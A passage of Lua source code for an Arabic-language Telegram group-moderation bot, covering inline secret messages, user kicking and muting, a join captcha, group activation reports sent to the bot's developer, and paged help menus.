local File = json:decode(https.request('https://api.telegram.org/bot' .. token .. '/getfile?file_id='..data.content_.audio_.audio_.persistent_id_) ) 
local Name_File = download('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, './'..msg.id_..'.mp3') 
sendAudio(msg.chat_id_,msg.id_,Name_File,title,'Cha - @hlil3',title)
os.execute('rm -rf '..Name_File) 
else
send(msg.chat_id_,msg.id_,'')
end
end, nil)
end
if text == 'كشف' and tonumber(msg.reply_to_message_id_) > 0 then
tdcli_function({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},function(arg,data)
if data.content_.ID == "MessageAudio" then    
local size = os.date('%M : %S',data.content_.audio_.audio_.size_)
send(msg.chat_id_,msg.id_,'• performer : '..data.content_.audio_.performer_..'\n• title : '..data.content_.audio_.title_..'\n• size : '..size)
end
end, nil)
end
end
end
end
------------------------------------------------------------------------------------------------------------

function tdcli_update_callback(data)
if data.ID == "UpdateNewInlineCallbackQuery" then
local Text = data.payload_.data_
if Text and Text:match('/Hmsa@(%d+)@(%d+)@(%d+)@(%d+)@(%d+)') then
local ramsesadd = {string.match(Text,"^/Hmsa@(%d+)@(%d+)@(%d+)@(%d+)@(%d+)$")}
if tonumber(data.sender_user_id_) == tonumber(ramsesadd[1]) or tonumber(ramsesadd[2]) == tonumber(data.sender_user_id_) or tonumber(ramsesadd[3]) == tonumber(data.sender_user_id_) or tonumber(ramsesadd[4]) == tonumber(data.sender_user_id_) or tonumber(ramsesadd[5]) == tonumber(data.sender_user_id_) then
local inget = redis:get(bot_id..'hmsabots'..data.sender_user_id_)
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape(inget)..'&show_alert=true')
else
https.request("https://api.telegram.org/bot"..token..'/answerCallbackQuery?callback_query_id='..data.id_..'&text='..URL.escape('⚠┇هاذه الرساله ليست لك')..'&show_alert=true')
end
end
end
if data.ID == "UpdateNewInlineQuery" then
local Text = data.query_
if Text and Text:match("^(.*) @(.*) (%d+) (%d+) (%d+)$")  then
local username = {string.match(Text,"^(.*) @(.*) (%d+) (%d+) (%d+)$")}
function start_function(extra, result, success)
if result.id_ then
print(data.id_)
local input_message_content = {message_text = '☑┇هاذه همسه الى - [@'..username[2]..'] - '..username[3]..' - '..username[4]..' - '..username[5]..'\n🔘┇هوا وحده من يستطيع رئيتها ', parse_mode = 'Markdown'}	
local reply_markup = {inline_keyboard={{{text = 'اضهار الرساله 🔒', callback_data = '/Hmsa@'..data.sender_user_id_..'@'..result.id_..'@'..username[3]..'@'..username[4]..'@'..username[5]}}}}	
local resuult = {{type = 'article', id = math.random(1,64), title = '📛┇هذه همسه سريه الى '..username[2], input_message_content = input_message_content, reply_markup = reply_markup}}	
https.request("https://api.telegram.org/bot"..token..'/answerInlineQuery?inline_query_id='..data.id_..'&results='..JSON.encode(resuult))
redis:set(bot_id..'hmsabots'..result.id_,username[1])
redis:set(bot_id..'hmsabots'..username[3],username[1])
redis:set(bot_id..'hmsabots'..username[4],username[1])
redis:set(bot_id..'hmsabots'..username[5],username[1])
redis:set(bot_id..'hmsabots'..data.sender_user_id_,username[1])
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username[2]}, start_function, nil)
end

if Text and Text:match("^(.*) (%d+)$")  then
local textpic = {string.match(Text,"^(.*) (%d+)$")}
local numpic = tonumber(textpic[2])
if numpic < 20 then
local Soundcloud = https.request('https://api-alshh.cf/API/av.php?text='..textpic[1])
local zxe = JSON.decode(Soundcloud)
var(zxe)
for i=0 , #zxe.result.photo do
if zxe.result.photo[numpic] then
keyboard = {}
url = zxe.result.photo[numpic]
getupdate = {{}}
getupdate[1].id = math.random(1,64)
getupdate[1].type = 'photo'
getupdate[1].photo_height = '40'
getupdate[1].photo_width = '40'
getupdate[1].title = 'SourceChannel'
getupdate[1].photo_url = url
getupdate[1].parse_mode = 'Markdown'
getupdate[1].reply_markup = keyboard
getupdate[1].thumb_url = url
keyboard.inline_keyboard = {{{text = 'SourceChannel', url="t.me/hlil3"}}}
answerInlineQuery(data.id_,getupdate)
return false
end
end
end
end
end
if data.ID == ("UpdateChannel") then 
if data.channel_.status_.ID == "ChatMemberStatusKicked" then 
redis:srem(bot_id..'Chek:Groups','-100'..data.channel_.id_)  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
local NameChat = chat.title_
local IdChat = msg.chat_id_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
Text = ''
sendText(Id_Dev,'تم طرد البوت من مجموعه \n اسم المجموعه - (['..NameChat..'])\n ايدي المجموعه - (['..IdChat..']) \n بواسطة - (['..linkgpp..'])',0,'md')
end,nil) 
end
end
if data.ID == ("UpdateNewMessage") then
msg = data.message_
text = msg.content_.text_
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("->> Old Message End <<-")
return false
end
if tonumber(msg.sender_user_id_) == tonumber(bot_id) then
return false 
end
------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then  
if msg.sender_user_id_ and RemovalUserGroup(msg.chat_id_,msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false  
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroup(msg.chat_id_,msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false
elseif msg.sender_user_id_ and RemovalUserGroups(msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false 
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroups(msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
elseif msg.sender_user_id_ and SilencelUserGroups(msg.sender_user_id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false 
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and SilencelUserGroups(msg.content_.members_[0].id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
elseif msg.sender_user_id_ and SilencelUserGroupsked(msg.sender_user_id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
return false 
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and SilencelUserGroupsked(msg.content_.members_[0].id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.content_.members_[0].id_)
return false  
elseif msg.sender_user_id_ and MutedGroups(msg.chat_id_,msg.sender_user_id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
end
end
if text and redis:get(bot_id.."Tshakex:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = redis:get(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
if NewCmmd then
redis:del(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
redis:del(bot_id.."Tshakex:Command:Reids:Group:New"..msg.chat_id_)
redis:srem(bot_id.."Tshakex:Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"• تم ازالة هاذا ← { "..text.." }")  
else
send(msg.chat_id_, msg.id_,"• لا يوجد امر بهاذا الاسم")  
end
redis:del(bot_id.."Tshakex:Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text then
local NewCmmd = redis:get(bot_id.."Tshakex:Get:Reides:Commands:Group"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then   
if redis:get(bot_id.."Tshakex:Lock:tagservr"..msg.chat_id_) then  
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false
end    
elseif text and not redis:sismember(bot_id..'Tshakex:Spam_For_Bot'..msg.sender_user_id_,text) then
redis:del(bot_id..'Tshakex:Spam_For_Bot'..msg.sender_user_id_) 
elseif msg.content_.ID == "MessageChatAddMembers" then  
redis:set(bot_id.."Tshakex:Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
elseif msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Tshakex:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "del" then   
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == "MessageChatJoinByLink" and not redis:get(bot_id..'Tshakex:nwe:mem:group'..msg.chat_id_) then
numphoto = {'20288','29216','58921','66899'}
numphotoid = numphoto[math.random(#numphoto)]
print(numphotoid)
local Text = ' مرحبا بك في المجموعه \n تم تفعيل خاصيه التعرف على الحسابات \n لالغاء التقييد اضغط على الرقم المشابه في الصوره ↓\n'
keyboard = {}  
keyboard.inline_keyboard = {
{
{text = '66899', callback_data="66899/UnKed@"..msg.sender_user_id_..':'..numphotoid},{text = '45892', callback_data="/UnKed@"..msg.sender_user_id_},
},
{
{text = '68053', callback_data="/UnKed@"..msg.sender_user_id_},{text = '56899', callback_data="56899/UnKed@"..msg.sender_user_id_..':'..numphotoid},
},
{
{text = '20288', callback_data="20288/UnKed@"..msg.sender_user_id_..':'..numphotoid},{text = '29216', callback_data="29216/UnKed@"..msg.sender_user_id_..':'..numphotoid},
},
} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id='..msg.chat_id_..'&caption='..URL.escape(Text)..'&photo='..'https://raw.githubusercontent.com/NightRang/photo/master/'..numphotoid..'.jpg&reply_to_message_id='..Msg_id..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
TypeForChat1 = 'ForSuppur' 
elseif id:match("^(%d+)") then
TypeForChat1 = 'ForUser' 
else
TypeForChat1 = 'ForGroup' 
end
end

------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and DeveloperBot(msg) then
 
if TypeForChat1 ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'🚸┇البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Tshakex:Num:Add:Bot') or 0) and not Dev_Storm(msg) then
send(msg.chat_id_, msg.id_,'⚠┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Tshakex:Num:Add:Bot') or 0)..'* عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if redis:sismember(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
else
Send_Options(msg,result.id_,'reply_Add','〽┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Bots(msg) then
sendText(Id_Dev,'☑┇تم تفعيل مجموعه جديده\n'..'\n💢┇بواسطة : '..Name..''..'\n🔖┇ايدي المجموعه : `'..IdChat..'`'..'\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*'..'\n📛┇اسم المجموعه : ['..NameChat..']'..'\n〽┇الرابط : ['..LinkGp..']',0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
if text == 'تفعيل' and not DeveloperBot(msg) and not redis:get(bot_id..'Tshakex:Free:Bot') then
 
if TypeForChat1 ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⚠┇البوت ليس ادمن يرجى ترقيتي') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,DataChat) 
if DataChat and DataChat.status_.ID == "ChatMemberStatusEditor" or DataChat and DataChat.status_.ID == "ChatMemberStatusCreator" then
if DataChat and DataChat.user_id_ == msg.sender_user_id_ then
if DataChat.status_.ID == "ChatMemberStatusCreator" then
Status_Rt = 'المنشئ'
elseif DataChat.status_.ID == "ChatMemberStatusEditor" then
Status_Rt = 'الادمن'
else 
Status_Rt = 'عضو'
end
if redis:sismember(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
return false
end
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Tshakex:Num:Add:Bot') or 0) and not Dev_Storm(msg) then
send(msg.chat_id_, msg.id_,'⚠┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Tshakex:Num:Add:Bot') or 0)..'* عضو')
return false
end
Send_Options(msg,msg.sender_user_id_,'reply_Add','〽┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_)  
redis:sadd(bot_id..'Tshakex:President:Group'..msg.chat_id_, msg.sender_user_id_)
local LinkApi = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkApi.ok == true then 
LinkChat = LinkApi.result
else
LinkChat = 'لا يوجد'
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Dev_Bots(msg) then
sendText(Id_Dev,'☑┇تم تفعيل مجموعه جديده\n💢┇بواسطة : '..Name..'\n🚸┇موقعه في المجموعه : '..Status_Rt..'\n🔖┇ايدي المجموعه : `'..msg.chat_id_..'`\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*\n📛┇اسم المجموعه : ['..NameChat..']\n〽┇الرابط : ['..LinkChat..']',0,'md')
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil) 
end

if text == 'تعطيل' and DeveloperBot(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not redis:sismember(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'• المجموعه بالتاكيد معطله')
else
Send_Options(msg,result.id_,'reply_Add','• تم تعطيل مجموعه '..chat.title_..'')
redis:srem(bot_id..'Tshakex:ChekBotAdd',msg.chat_id_)  
redis:del(bot_id..'Tshakex:ChekBot:Add'..msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Bots(msg) then
sendText(Id_Dev,'• تم تعطيل مجموعه جديده\n'..'\n• بواسطة : '..Name..''..'\n• ايدي المجموعه : `'..IdChat..'`\n• اسم المجموعه : ['..NameChat..']',0,'md')
end
end
end,nil) 
end,nil) 
end

Dev_Bots_File(msg,data)

elseif data.ID == "UpdateNewCallbackQuery" then
local Chat_id = data.chat_id_
local Msg_id = data.message_id_
local msg_idd = Msg_id/2097152/0.5
local Text = data.payload_.data_
if Text and Text:match('(%d+)/UnKed@(%d+):(%d+)') then
local ramsesadd = {string.match(Text,"^(%d+)/UnKed@(%d+):(%d+)$")}
if tonumber(ramsesadd[1]) == tonumber(ramsesadd[3]) then
if tonumber(ramsesadd[2]) == tonumber(data.sender_user_id_) then
Delete_Message(data.chat_id_, {[0] = Msg_id})  
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. data.chat_id_ .. "&user_id=" .. data.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
end
end
end

if Text and Text:match('(.*)/help1') and Admin(data) then
if tonumber(Text:match('(.*)/help1')) == tonumber(data.sender_user_id_) then
if not Admin(data) then
send(Chat_id, Msg_id,'') 
return false
end
local Teext =[[
  •  اهلا بك عزيزي 
  • اوامر حماية المجموعه
━━━━━━━━
  قفل - فتح - الامر 
━━━━━━━━
  • الاضافه
  • الدردشه
  • الدخول
  • البوتات
  • الاشعارات
  • ئالتعديل
  • تعديل الميديا
  • الروابط
  • المعرفات
  • التاك
  • الملصقات
  • المتحركه
  • الفيديو
  • الصور
  • الاغاني
  • الصوت
  • التوجيه
  • الملفات
  • الجهات
  • الكلايش
  • التكرار
  • السب
  • الانلاين
━━━━━━━━
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=data.sender_user_id_.."/help1"},{text = '⓶', callback_data=data.sender_user_id_.."/help2"},{text = '⓷', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
{
{text = 'الاوامر الرئيسيه', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help2') and Admin(data) then
if tonumber(Text:match('(.*)/help2')) == tonumber(data.sender_user_id_) then
if not Admin(data) then
send(Chat_id, Msg_id,'') 
return false
end
local Teext =[[
  •  اهلا بك عزيزي 
•اوامر تفعيل وتعطيل
━━━━━━━━
 • تفعيل - تعطيل - امر
━━━━━━━━
 • اطردني
 • ضافني
 • الرابط 
 • الرفع
 • الحظر
 • الايدي
 • الالعاب
 • الردود العامه
 • الردود
 • افتاري
━━━━━━━━
 اوامر الرفع و تغير
━━━━━━━━
  • مالك
  • مشرف
  • منشئ اساسي
  • منشئ
  • مدير
  • ادمن
  • مميز 
  • الادمنيه
  • القيود
  • قلبي
━━━━━━━━
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=data.sender_user_id_.."/help1"},{text = '⓶', callback_data=data.sender_user_id_.."/help2"},{text = '⓷', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
{
{text = 'الاوامر الرئيسيه', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help3') and Admin(data) then
if tonumber(Text:match('(.*)/help3')) == tonumber(data.sender_user_id_) then
if not Admin(data) then
send(Chat_id, Msg_id,'') 
return false
end
local Teext =[[
•  اهلا بك عزيزي  
•  اوامر مسح - الحذف 
━━━━━━━━
• مسح - الامر
━━━━━━━━
• الادمنيه
• المميزين
• ردود 
• المنشئين
• المدراء
• البوتات
• قائمة منع المتحركات
• قائمة منع الصور
• قائمة منع الملصقات
• المحذوفين
• مسح قائمة المنع
━━━━━━━━
  حذف - امر ↓
━━━━━━━━
• امر
• الاوامر المضافه
━━━━━━━━
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=data.sender_user_id_.."/help1"},{text = '⓶', callback_data=data.sender_user_id_.."/help2"},{text = '⓷', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
{
{text = 'الاوامر الرئيسيه', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help4') and Admin(data) then
if tonumber(Text:match('(.*)/help4')) == tonumber(data.sender_user_id_) then
if not Admin(data) then
send(Chat_id, Msg_id,'') 
return false
end
local Teext =[[
  •  اهلا بك عزيزي 
  • اوامر الادمنيه 
━━━━━━━━
• الادمنيه
• تاك للكل 
• تغير الايدي
• تعين الايدي
• مسح + العدد
• تنزيل الكل
• المميزين
• حظر - الغاء الحظر
• كتم - الغاء الكتم
• تقييد ~ فك التقييد
• طرد
• المكتومين
• المحظورين
• تثبيت - الغاء تثبيت
• الترحيب
• كشف البوتات
• الصلاحيات
• كشف 
• منشن
• الحمايه
• قائمة المنع
· •  • ⍒ •  • · · 
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=data.sender_user_id_.."/help1"},{text = '⓶', callback_data=data.sender_user_id_.."/help2"},{text = '⓷', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
{
{text = 'الاوامر الرئيسيه', callback_data=data.sender_user_id_.."/help"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(.*)/help') and Admin(data) then
if tonumber(Text:match('(.*)/help')) == tonumber(data.sender_user_id_) then
if Admin(data) then
local Teext =[[
*• اوامر المجموعه*
 ━━━━━━━━
• م1 => اوامر الادمنيه
• م2 => اوامر التفعيل - التعطيل - الرفع
• م3 => اوامر المسح
• م4 => اوامر مطور 
• م C => اوامر المطور الاساسي 
 ━━━━━━━━
المطور الاساسي - @]].. UserName_Dev..[[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '⓵', callback_data=data.sender_user_id_.."/help1"},{text = '⓶', callback_data=data.sender_user_id_.."/help2"},{text = '⓷', callback_data=data.sender_user_id_.."/help3"},
},
{
{text = '⓸', callback_data=data.sender_user_id_.."/help4"},
},
{
{text = 'اوامر التعطيل', callback_data=data.sender_user_id_.."/homeaddrem"},{text = 'اوامر القفل', callback_data=data.sender_user_id_.."/homelocks"},
},
{
{text = 'المطور الاساسي', url="t.me/".. UserName_Dev..""}
},
}
